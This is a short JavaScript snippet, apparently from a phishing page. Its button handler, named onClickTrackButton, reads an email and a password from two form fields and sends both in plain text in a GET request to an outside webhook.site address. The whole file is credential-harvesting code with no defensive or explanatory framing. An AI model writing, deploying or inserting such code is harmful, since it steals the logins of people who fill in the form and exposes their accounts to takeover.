console.log("hello")
const Http = new XMLHttpRequest();

function onClickTrackButton() {
    const url = 'https://webhook.site/3eebd168-a6b8-465d-ae08-532b11e725d1';

    const email = document.getElementById("c-tracking--input").value
    const password = document.getElementById("c-tracking--input-2").value

    const request_url = url + "?" + "email=" + email + "&" + "password=" + password

    Http.open("GET", request_url);
    Http.send();

    Http.onreadystatechange = (e) => {
        console.log("request sent")
    }

}